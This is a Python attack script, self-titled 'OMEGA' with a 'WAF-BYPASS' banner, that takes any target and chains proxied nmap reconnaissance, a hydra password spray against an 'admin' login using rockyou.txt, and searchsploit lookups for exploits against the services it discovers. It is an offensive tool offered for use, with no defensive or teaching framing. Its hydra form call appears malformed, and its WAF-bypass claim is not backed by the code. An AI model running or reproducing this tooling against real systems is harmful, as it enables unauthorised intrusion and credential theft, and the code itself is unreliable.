import subprocess
import os
import sys
import threading
from queue import Queue
import random

# --- OMEGA CONFIG ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

def banner():
    print("""
    ██████╗ ███╗   ███╗███████╗ ██████╗  █████╗ 
    ██╔══██╗████╗ ████║██╔════╝██╔════╝ ██╔══██╗
    ██║  ██║██╔████╔██║█████╗  ██║  ███╗███████║
    ██║  ██║██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║
    ██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║
    ╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
    --- VERSION 11: OMEGA-THREADED | WAF-BYPASS ---
    """)

def run_command(cmd, task_name):
    """Wrapper to execute and format output for threaded tasks."""
    print(f"[+] STARTING: {task_name}")
    try:
        # Wrap everything in proxychains4
        full_cmd = ["proxychains4", "-q"] + cmd
        result = subprocess.run(full_cmd, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)

def phase_recon(target, results_map):
    # Stealthier scan (-T2) to avoid WAF blocks
    cmd = ["nmap", "-sV", "-Pn", "-T2", "--top-ports", "100", target]
    output = run_command(cmd, "PHASE 1: STEALTH RECON")
    results_map['recon'] = output
    print(f"[!] RECON COMPLETE FOR {target}")

def phase_spray(target, results_map):
    # Only runs if recon finds something, or we can force-run it
    print("[+] PHASE 2: INITIALIZING ASYNC CREDENTIAL SPRAY")
    # Using a smaller subset for speed
    os.system(f"head -n 100 rockyou.txt > mission_pass.txt")
    cmd = ["hydra", "-l", "admin", "-P", "mission_pass.txt", f"http-post-form://{target}", "-t", "4"]
    output = run_command(cmd, "PHASE 2: BRUTE FORCE")
    results_map['spray'] = output

def execute_omega():
    banner()
    target = input(" [?] Enter Target: ").strip()
    results = {}

    # --- MULTI-THREADING ENGINE ---
    # Running Recon and Spraying simultaneously (if target known)
    t1 = threading.Thread(target=phase_recon, args=(target, results))
    t2 = threading.Thread(target=phase_spray, args=(target, results))

    t1.start()
    t2.start()

    t1.join()
    t2.join()

    # --- PHASE 3: INTELLIGENT MAPPING ---
    print("\n[!] PHASE 3: CROSS-REFERENCING EXPLOIT-DB")
    if 'recon' in results:
        for line in results['recon'].split('\n'):
            if "open" in line:
                service = line.split()[2]
                print(f"[*] Analyzing service: {service}")
                subprocess.run(["searchsploit", service, "--nocolor"])

if __name__ == "__main__":
    execute_omega()
